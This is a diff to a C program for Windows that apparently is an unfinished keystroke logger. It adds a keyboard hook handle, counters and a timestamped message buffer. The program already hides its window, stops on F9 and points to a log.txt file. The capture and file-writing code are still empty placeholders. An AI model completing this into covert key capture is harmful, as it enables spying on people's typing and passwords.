@@ -1,6 +1,7 @@
-#include <windows.h>
-#include <stdlib.h>
+#include <Windows.h>
+#include <inttypes.h>
 #include <stdio.h>
+#include <time.h>
 
 #ifndef _BOOL_DEF_
     #define _BOOL_DEF_
@@ -10,6 +11,17 @@
 #endif
 
 void renderMenu(); /* function prototype */
+/* most people can't write over 1500 characters a minute */
+#define MESSAGE_BUFFER_SIZE 1500
+HHOOK keyboardHook;
+uint_fast16_t messageCount = 1;
+uint_fast16_t keyCount = 0;
+
+struct Message {
+    char message[MESSAGE_BUFFER_SIZE];
+    time_t messageTime;
+    struct tm* timeinfo;
+};
 
 void clear() {
     system("cls");
@@ -61,10 +73,13 @@ int main(int argc, char* argv[]) {
 
 
         /* capture code */
-
+        
 
         /* If the terminate key (F9) is pressed. */
         if (GetAsyncKeyState(VK_F9) & 0x8000) {
+            /* Write to file */
+            // ...
+
             MessageBeep(0xFFFFFF);
             ShowWindow(window, 1);
             puts("\n\n\n\n\n\n\n\nProgram has terminated, please check the log.txt file.\n"
